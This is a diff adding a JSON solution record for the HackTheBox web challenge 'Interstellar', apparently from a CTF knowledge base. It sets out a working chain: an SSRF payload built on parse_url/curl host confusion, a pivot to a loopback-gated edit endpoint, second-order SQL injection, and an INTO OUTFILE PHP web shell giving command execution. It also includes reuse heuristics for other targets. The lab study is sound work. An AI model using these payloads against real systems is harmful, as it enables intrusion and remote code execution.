@@ -1,0 +1,150 @@
+{
+ "schema_version": 1,
+ "id": "htb-interstellar-parseurl-curl-host-confusion-ssrf-localhost-edit-stored-proc-sqli-outfile-rce",
+ "source_note": "challenges/Interstellar/challenge/src/communicate.php",
+ "challenge": {
+  "name": "Interstellar",
+  "platform": "HackTheBox",
+  "event": "HackTheBox",
+  "category": "web",
+  "solved_at": "2026-09-26",
+  "assistance": "writeup-assisted"
+ },
+ "stack": [
+  "php",
+  "apache",
+  "mysql",
+  "smarty",
+  "curl",
+  "docker"
+ ],
+ "preconditions": {
+  "all_of": [
+   "a server-side fetch validates the host with parse_url() and then hands curl something OTHER than the original URL (communicate.php:17 sets CURLOPT_URL to $parsedUrl['host'] alone)",
+   "the host allowlist is a suffix regex with no left anchor and no delimiter (communicate.php:13 preg_match('/motherland\\.com$/', $parsedUrl['host']))",
+   "the fetch FORWARDS the caller's own session cookie (communicate.php:16-23 sets 'Cookie: PHPSESSID=$sessCookie'), so the server-side request is authenticated as the attacker",
+   "a privileged action is gated only on REMOTE_ADDR (index.php:45), so a request that originates on the box AND carries the attacker's session is fully trusted",
+   "the value that action writes is later concatenated into dynamic SQL by a stored procedure (init.sql:18 searchUser does CONCAT), while editName (init.sql:44-49) stores it with bound parameters",
+   "the DB account is root@127.0.0.1 (init.sql:53-56), so FILE and INTO OUTFILE into the webroot are available"
+  ],
+  "any_of": [
+   "the fetch echoes the response body back (communicate.php:36), giving a read oracle for free",
+   "the page collapses to a short error body on a SQL error, giving a boolean oracle when nothing is reflected"
+  ]
+ },
+ "signals": [
+  "motherland.com",
+  "communicate.php",
+  "searchUser",
+  "editName",
+  "registerUser",
+  "loginUser",
+  "REMOTE_ADDR",
+  "CURLOPT_URL",
+  "CURLOPT_POSTFIELDS",
+  "http_build_query",
+  "parse_url",
+  "filter_var",
+  "PHPSESSID=$sessCookie",
+  "pick_emoji",
+  "INTO OUTFILE",
+  "planet",
+  "Wrong URL!",
+  "Failed when parsing URL!",
+  "Send request to your mother land",
+  "getSmarty",
+  "index.tpl",
+  "communicate.tpl"
+ ],
+ "chain": [
+  {
+   "step": 1,
+   "stage": "recon",
+   "action": "read the front-end JS before sending anything: /js/sendForm.js rewrites the visible Key/Value inputs into data[<key>]=<value>, so the real POST shape is url=<u>&data[k]=v, not key=..&value=..",
+   "why": "the form fields are a lie about the wire format; probing with the visible names wastes the first probes and hides that data[] is an arbitrary POST body for the server-side request"
+  },
+  {
+   "step": 2,
+   "stage": "primitive",
+   "action": "separate the two rejection messages: 'Wrong URL!' means the host allowlist rejected it, 'Failed when parsing URL!' means filter_var(FILTER_VALIDATE_URL) rejected it. Probe both until each input maps to exactly one",
+   "why": "two distinct messages are two distinct gates, and the order (filter_var first, host regex second) is what tells you the host must both validate AND end in the allowed name"
+  },
+  {
+   "step": 3,
+   "stage": "primitive",
+   "action": "establish the allowlist is a bare suffix: http://notmotherland.com/ passes and http://evil.com/?x=motherland.com does not",
+   "why": "proves preg_match('/motherland\\.com$/', $parsedUrl['host']) — a suffix test on the parsed host, not on the whole URL and not an equality test"
+  },
+  {
+   "step": 4,
+   "stage": "primitive",
+   "action": "exploit that CURLOPT_URL is set to $parsedUrl['host'] alone: send url=0://127.0.0.1:80;motherland.com:80/ so parse_url keeps the whole '127.0.0.1:80;motherland.com:80' as host (matching the suffix) while curl stops at 127.0.0.1:80",
+   "why": "PHP's parse_url takes the authority verbatim; curl re-parses that string as a URL and terminates the host earlier. The 0:// scheme exists only to get past filter_var, which rejects the same host under http://"
+  },
+  {
+   "step": 5,
+   "stage": "pivot",
+   "action": "POST through the SSRF with data[action]=edit and data[new_name]=<value>, then confirm with GET / that the name changed",
+   "why": "index.php:45 gates the edit on REMOTE_ADDR != '127.0.0.1', so it is unreachable from outside. Two things make the pivot work and BOTH are needed: communicate.php:19 turns data[] into the POST body with http_build_query(), and communicate.php:16-23 forwards the caller's own PHPSESSID, so index.php restores $_SESSION['id'] and editName updates the ATTACKER's row (index.php:54 binds $id from the session). Without the forwarded cookie the SSRF would only get the login.php redirect at index.php:75."
+  },
+  {
+   "step": 6,
+   "stage": "primitive",
+   "action": "quote-balance the stored name: new_name=probe' collapses GET / to a 167-byte page, new_name=probe'' renders in full. Then walk the column count 3..6 — only 5 renders",
+   "why": "second-order SQLi. register.php:8 strips the name with preg_replace('/[^a-zA-Z0-9]/','',$name), but index.php:50 takes $_REQUEST['new_name'] with no filter at all, and editName (init.sql:44-49) stores it through bound parameters, so the payload lands verbatim. It only executes on the NEXT GET /, where searchUser (init.sql:18) does CONCAT('SELECT * FROM users WHERE name = \\'', name, '\\''). The page-length difference is the only oracle: index.php:33 assigns the name from the SESSION, not from the query, and index.php:31 pushes planet through pick_emoji(), so a UNION cannot reflect a value anywhere."
+  },
+  {
+   "step": 7,
+   "stage": "impact",
+   "action": "set the name to  probe' UNION SELECT 1,2,3,4,\"<?php system($_GET[\\\"c\\\"]); ?>\" INTO OUTFILE '/var/www/html/<unique>.php'#  then GET / once to execute it, then call the file",
+   "why": "MySQL writes the result row tab-separated, so the file is '1\\t2\\t3\\t4\\t<?php ...?>' and PHP still executes the tag. Runs as www-data; the flag sits at /<random hex>_flag.txt, which needs a directory listing and therefore command execution rather than LOAD_FILE"
+  },
+  {
+   "step": 8,
+   "stage": "cleanup",
+   "action": "reset the name through the same SSRF and rm the dropped file with the shell before deleting it",
+   "why": "leaving the OUTFILE payload in the name makes every later GET / fail, because INTO OUTFILE refuses to overwrite an existing file and the page collapses to the SQL-error body"
+  }
+ ],
+ "first_confirming_probe": {
+  "request": "POST /communicate.php with url=0://127.0.0.1:80;motherland.com:80/ and data[action]=edit&data[new_name]=ZZTESTZZ, then GET /",
+  "expected": "GET / renders 'Yo, ZZTESTZZ' — the host-confusion reached loopback AND the REMOTE_ADDR-gated edit accepted the request, proving both the SSRF and the pivot in one shot",
+  "falsifier": "'Wrong URL!' (the suffix regex is anchored or compares the whole host), 'Failed when parsing URL!' (filter_var rejected the scheme/host shape -- retry under a junk scheme), or the name is unchanged, which means either curl did not stop at 127.0.0.1 or the fetch does not forward your session cookie, in which case index.php answers the login redirect instead of running the edit."
+ },
+ "blast_radius": "Step 7 WRITES a PHP file into the webroot as the mysql user and gives command execution as www-data; pick a unique filename, because INTO OUTFILE refuses an existing path and a second trigger then only produces SQL errors. The injected name persists in the database and re-runs on EVERY page view until it is reset, so the app stays broken until step 8. Everything before step 7 touches only your own row. The SSRF itself is a blind-ish POST to loopback with a 1s curl timeout.",
+ "verification": {
+  "status": "verified_live",
+  "evidence": "Live HTB instance. The dropped file returned uid=33(www-data) gid=33(www-data) groups=33(www-data), ls / showed a single <hex>_flag.txt at the root, and cat of it returned the flag in the HTTP response body. Recorded in challenges/target-31236/state.json through tools/hooks.py post-probe (confirms, evidence-kind class then impact) and pre-flag (source live-response). Cleaned up afterwards: name reset and the file removed (404)."
+ },
+ "reuse_when": [
+  "a server-side fetch validates one string and then passes a DIFFERENT string to the HTTP client -- the host alone, a re-joined URL, a normalised copy",
+  "a host allowlist is a regex with $ but no left anchor or delimiter, so notallowed.com ends with allowed.com",
+  "a server-side fetch forwards the caller's cookies or Authorization header: the SSRF is then an authenticated request as you, which is what makes an internal-only action operate on YOUR row",
+  "two different rejection messages come back from one input -- each is a separate gate and their order tells you how to satisfy both",
+  "a privileged action is gated on REMOTE_ADDR / X-Forwarded-For / a loopback check rather than on identity",
+  "PHP uses prepared statements but the query is CALL <procedure>(?) -- the injection can live inside the procedure, where bind_param does nothing",
+  "an input is sanitised on one path (registration) and unsanitised on another that writes the same column (an internal edit endpoint)",
+  "the only difference between a good and a bad payload is the page length: treat that as a boolean oracle rather than hunting for reflected output"
+ ],
+ "known_traps": [
+  "parse_url strips the port into its own key, so a :port in the submitted URL never reaches curl when only ['host'] is forwarded. An early port sweep across 1/22/80/3306/8080 that returns identical timeouts is measuring nothing -- the port was discarded before curl saw it.",
+  "the pivot needs TWO things, not one: communicate.php:19 turns data[] into the POST body with http_build_query(), and communicate.php:16-23 forwards the caller's own Cookie: PHPSESSID=$sessCookie. That forwarded cookie is why index.php restores $_SESSION['id'] and editName updates the ATTACKER's row. When a server-side fetch forwards your credentials, the SSRF is an authenticated request as you -- check for that before assuming an internal endpoint is useless.",
+  "0://[::ffff:127.0.0.1].motherland.com:80/ passes both gates and connects, but every port times out with 0 bytes: curl takes the bracketed IPv6 literal and nothing answers it in this container. 0://[127.0.0.1].motherland.com/ does reach loopback but Apache answers 400 because the Host header becomes '[127.0.0.1].motherland.com'. Both look like a working SSRF; only the semicolon form yields a usable request.",
+  "the REMOTE_ADDR check is a STRICT allowlist -- index.php:45 is  if ($_SERVER['REMOTE_ADDR'] != '127.0.0.1')  -- so the origin must be exactly 127.0.0.1. Public writeups describe it as a blocklist that bans 127.0.0.2 and lets every other loopback address through; that is wrong, and believing it makes ::1 and 127.0.0.2 look like valid alternatives when neither passes. This was corrected against the handout after the solve.",
+  "filter_var(FILTER_VALIDATE_URL) is stricter for http:// than for an unknown scheme: percent-encoded and bracketed hosts rejected under http:// are accepted under 0://. If a host shape is rejected, retry it with a junk scheme before discarding it. filter_var runs FIRST (communicate.php:11) and the host regex second (communicate.php:13), which is why the two error strings identify which gate you are against.",
+  "the visible Key and Value inputs are not the wire format -- js/sendForm.js rewrites them to data[<key>]=<value> and communicate.php:19 runs http_build_query($data). Probing with key=/value= still exercises the URL gate, so URL findings stay valid, but the SSRF body does nothing until the array shape is used.",
+  "CURLOPT_TIMEOUT is 1 second (communicate.php:24), so every server-side request has a one-second budget; a 'timed out after ~1000ms with 0 bytes' error says nothing about whether the target exists.",
+  "the injection is SECOND ORDER: the write returns nothing useful and the SQL only runs on the next GET /. A payload that looks inert on submission is already armed.",
+  "do not spend probes hunting for a reflected column: index.php:33 renders the name from the session and index.php:31 maps planet through pick_emoji(), so the channel is the page length (about 4650 bytes valid vs 72 on a SQL error)."
+ ],
+ "flag": null,
+ "classification": {
+  "primary": "web-ssrf",
+  "secondary": [
+   "web-parser-differential",
+   "web-sqli",
+   "web-logic-flaw"
+  ],
+  "confidence": 0.9
+ }
+}
